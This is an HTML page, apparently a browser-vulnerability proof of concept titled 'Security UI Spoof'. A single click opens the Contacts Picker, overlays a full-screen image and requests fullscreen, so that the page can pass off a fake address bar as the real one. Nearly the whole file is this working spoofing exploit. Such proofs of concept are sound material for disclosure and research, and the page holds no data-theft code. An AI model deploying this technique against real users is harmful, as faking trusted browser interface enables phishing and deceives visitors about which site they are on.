<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof</title>
  <meta charset="utf-8">
  <meta
    name="viewport"
    content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
  />

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spoof2.png" alt="spoof">

<div id="content">
  <h1>Click anywhere on the page to spoof the omnibox!</h1>
</div>

<script>
  document.addEventListener('click', async () => {

    // 1️⃣ Trigger trusted system UI (Contacts Picker)
    if (navigator.contacts && navigator.contacts.select) {
      navigator.contacts.select(["name"], {}).catch(() => {});
    }

    // 2️⃣ Show spoof overlay
    document.getElementById('spoof').style.display = 'block';
    document.getElementById('content').style.display = 'none';

    // 3️⃣ Request fullscreen
    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen().catch(() => {});
    }

  }, { once: true });
</script>

</body>
</html>
